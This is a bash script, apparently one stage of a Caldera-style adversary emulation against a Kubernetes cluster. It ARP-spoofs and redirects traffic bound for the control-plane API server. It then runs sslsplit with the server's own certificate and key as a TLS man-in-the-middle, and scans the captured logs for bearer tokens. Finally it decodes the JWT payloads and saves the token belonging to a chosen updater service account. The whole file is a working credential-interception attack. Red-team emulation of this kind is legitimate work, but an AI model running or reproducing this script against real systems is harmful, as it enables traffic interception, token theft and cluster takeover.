#!/usr/bin/env bash
set -euo pipefail

UPSTREAM_HOST="$CONTROL_PLANE_NODE"
UPSTREAM_PORT="$CONTROL_PLANE_PORT"
IFACE="eth0"
LOGDIR="$DATA_PATH/KC5/logdir"
PIDFILE="$DATA_PATH/KC5/arp_pids"

LEAF_PEM="$DATA_PATH/KC5/inbound.pem"
TOKEN_RE='[Bb]earer[[:space:]]+([A-Za-z0-9._~+/=\-]+)'
UPDATER_NAMESPACE="${UPDATER_NAMESPACE:-${LOG_NS:-mem}}"
UPDATER_SERVICE_ACCOUNT="${UPDATER_SERVICE_ACCOUNT:-updater-sa}"
REQUIRED_SUBSTR="system:serviceaccount:${UPDATER_NAMESPACE}:${UPDATER_SERVICE_ACCOUNT}"
OUTPUT_PATH="$DATA_PATH/KC5/found_token"
IPAPI=$(dig +short $UPSTREAM_HOST A)
TOKEN_TIMEOUT="${MITM_TOKEN_TIMEOUT:-300}"

cleanup() {
  local rc=$?
  echo "[*] Cleanup..."
  ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null || true
  [[ -n "${SSLPID:-}" ]] && kill "$SSLPID" 2>/dev/null || true
  exit "$rc"
}
trap cleanup EXIT

# 1) Setup
apt update >/dev/null 2>&1
apt install -y sslsplit jq iptables iproute2 ca-certificates >/dev/null 2>&1
mkdir -p $LOGDIR
echo "[*] Looking for token subject containing: ${REQUIRED_SUBSTR}"

# 2) Modification ip status
sysctl -w net.ipv4.conf.all.rp_filter=0
sysctl -w net.ipv4.conf."$IFACE".rp_filter=0
sysctl -w net.ipv4.ip_forward=1

# 3) REDIRECT TCP traffic directed to VIP:CONTROL_PLANE_PORT to local port CONTROL_PLANE_PORT (proxy)
if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null; then
  iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT"
fi

if [[ ! -s /apiserver/apiserver.crt || ! -s /apiserver/apiserver.key ]]; then
  echo "Missing API server certificate/key in /apiserver" >&2
  exit 1
fi

/opt/caldera/KC2/nmap-enum.sh "$DATA_PATH/KC5"
/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "/tmp/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" "$PIDFILE"

cat /apiserver/apiserver.crt /apiserver/apiserver.key > $LEAF_PEM

nohup sslsplit \
  -A "$LEAF_PEM" \
  -P \
  -S "$LOGDIR" \
  -M "$DATA_PATH/KC5/sslkeys.log" \
  -l "$DATA_PATH/KC5/connect.log" \
  -D \
  ssl 0.0.0.0 "$UPSTREAM_PORT" >/dev/null 2>&1 &
SSLPID=$!

check_log_file() {
  local f="$1"
  local auth_line tok payload payload_json sub

  # 1) takes Authorization header (case-insensitive)
  auth_line="$(awk 'tolower($1)=="authorization:" {for(i=2;i<=NF;i++) printf "%s ", $i; print ""; exit}' "$f" 2>/dev/null || true)"
  [[ -z "$auth_line" ]] && return 1

  # 2) takes only token (remove "Bearer ")
  tok="$(printf '%s' "$auth_line" | grep -Eo "$TOKEN_RE" | sed -E 's/^[Bb]earer[[:space:]]+//; s/[[:space:]]+$//; q' || true)"
  [[ -z "$tok" ]] && return 1

  # 3) decodes payload (base64url -> json)
  IFS='.' read -r _ payload _ <<< "$tok"
  payload_json="$(printf '%s' "$payload" \
    | tr '_-' '/+' \
    | awk '{l=length($0)%4; if(l==2){print $0"=="} else if(l==3){print $0"="} else if(l==0){print $0} else {print $0}}' \
    | base64 -d 2>/dev/null || true)"
  [[ -z "$payload_json" ]] && return 1

  # 4) verify string in JSON (or on .sub)
  if echo "$payload_json" | grep -q -- "$REQUIRED_SUBSTR"; then
    printf '%s\n' "$tok" > "$OUTPUT_PATH"
    echo "[*] Token saved (match on JSON) -> $OUTPUT_PATH"
    return 0
  fi

  sub="$(echo "$payload_json" | jq -r '.sub // empty' 2>/dev/null || true)"
  if [[ -n "$sub" && "$sub" == *"$REQUIRED_SUBSTR"* ]]; then
    printf '%s\n' "$tok" > "$OUTPUT_PATH"
    echo "[*] Token saved (match on .sub) -> $OUTPUT_PATH"
    return 0
  fi

  return 1
}

deadline=$((SECONDS + TOKEN_TIMEOUT))
while (( SECONDS < deadline )); do
  while IFS= read -r -d '' f; do
    if check_log_file "$f"; then
      exit 0
    fi
  done < <(find "$LOGDIR" -type f -name '*.log' -print0 2>/dev/null)
  sleep 1
done

echo "Token not found in $LOGDIR after ${TOKEN_TIMEOUT}s" >&2
exit 1
